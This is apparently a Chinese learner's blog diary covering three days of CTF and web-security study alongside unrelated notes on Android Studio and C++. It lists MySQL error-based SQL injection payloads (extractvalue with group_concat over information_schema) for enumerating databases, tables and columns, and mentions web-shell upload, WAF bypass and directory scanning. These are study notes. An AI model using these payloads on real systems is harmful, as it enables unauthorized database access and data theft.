        <content type="html"><![CDATA[<h1 id="随笔"><a class="anchor" href="#随笔">#</a> 随笔</h1><h2 id="22-9-17-saturday"><a class="anchor" href="#22-9-17-saturday">#</a> 22-9-17 Saturday</h2><h3 id="今天学习的内容"><a class="anchor" href="#今天学习的内容">#</a> 今天学习的内容</h3><p>上午在图书馆做题；学了盲注、报错注入</p><p>漏洞要全面学习；payload 上传 shell 蚁剑链接木马；初步了解代码审计，PHP 语法使用</p><p>//......../index.php；类似的页面进入</p><p>?...... 输入</p><p>count (*)；union 注入</p><h3 id="group_concat"><a class="anchor" href="#group_concat">#</a> group_concat</h3><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>extractvaule 报错注入</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token boolean">null</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">-- '</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">-- 查数据库</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token boolean">null</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">-- '</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">-- 查库的表</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token boolean">null</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">-- '</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">-- 查表的字段</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token boolean">null</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span> <span class="token keyword">from</span> db<span class="token punctuation">.</span><span class="token keyword">table</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">-- '</span></pre></td></tr></table></figure><p>database()、order by、</p><p><strong>sql 注入的基本操作</strong></p><p>select S</p><h2 id="22-9-18-sunday"><a class="anchor" href="#22-9-18-sunday">#</a> 22-9-18 Sunday</h2><p>装了 Android studio；flutter sdk</p><p>20 来个 g~~（感觉 C 盘被吞了一样）~~</p><p>很想去旅游啊，<s>不仅是空间的变换，更是心灵的洗礼</s>。</p><p>今天晚上，学了点<strong> c++</strong>，复习了一下 continue</p><p>学了数组，一维数组，二维数组。</p><h2 id="22-9-19-monday"><a class="anchor" href="#22-9-19-monday">#</a> 22-9-19 Monday</h2><p>今天 CTF 第五空间比赛，一题没做出。</p><p>看 RZ 姐的 WP 做出了 2 题，easy-mysql 一直做不出。</p><p>涉及到命令行，SQL 方面 -- 尤其盲注，命令行 waf 绕过</p><p>什么时候用 sql，命令行</p><p>mid (,) 字符截取，从第几个字符开始截取多少个。</p><p>晚上了解社工。</p><p>通过 git 泄露查源码。webpack 可能导致前段源码裸露。</p><p><span class="exturl" data-url="aHR0cDovL2FwaS5naXRodWIuY29tLy4uLi4vcmVwb3Mv">api.github.com/..../repos/</span></p><p>打标靶网站时在 kali 上跑 dirb。</p><p>wappalyzer 可以扫描前端使用的语言，针对性查询漏洞。</p>]]></content>
      
      
